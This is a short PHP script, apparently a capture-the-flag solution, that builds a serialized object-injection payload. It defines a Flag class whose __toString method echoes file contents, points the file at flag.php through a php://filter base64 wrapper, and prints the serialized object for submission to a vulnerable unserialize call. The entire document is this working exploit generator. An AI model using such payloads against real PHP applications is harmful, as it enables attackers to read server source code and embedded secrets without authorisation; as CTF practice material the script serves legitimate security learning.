<?php
class Flag{//flag.php  
	public $file;  
	public function __tostring(){  
		if(isset($this->file)){  
			if(isset($this->file)){  
		        echo file_get_contents($this->file); 
				echo "<br>";
				return ("good");
			}  
		}  
	}
}
$f = new Flag();
$f->file="php://filter/read=convert.base64-encode/resource=flag.php"; 
echo serialize($f); 
?>